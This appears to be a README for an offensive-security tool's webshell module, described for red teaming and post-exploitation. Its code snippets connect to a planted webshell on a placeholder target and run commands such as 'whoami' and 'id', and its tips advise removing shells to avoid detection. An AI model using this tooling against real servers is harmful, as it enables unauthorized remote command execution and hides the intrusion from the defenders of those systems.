# Webshell API

The OFX Webshell API module provides utilities for managing, deploying, and interacting with webshells during red teaming and post-exploitation workflows.

---

## Features
- Deploy webshells to remote servers
- Connect and execute commands via webshells
- Support for multiple webshell types (PHP, ASPX, JSP, etc.)
- Integrate with OFX workflows and automation

---

## Usage in Python
```python
from ofx.api.webshell import WebShellClient

# Connect to a deployed webshell
client = WebShellClient(url="http://target.com/shell.php", password="pass")
resp = client.execute("whoami")
print(resp)
```

---

## Usage in Workflow YAML
```yaml
steps:
	- name: Execute via Webshell
		run: |
			from ofx.api.webshell import WebShellClient
			client = WebShellClient(url="http://target.com/shell.php", password="pass")
			print(client.execute("id"))
		script:
		outputs:
			result: "{{ step.stdout }}"
```

---

## Tips
- Use strong, unique passwords for webshells
- Clean up webshells after use to avoid detection
- Use the API to automate post-exploitation tasks
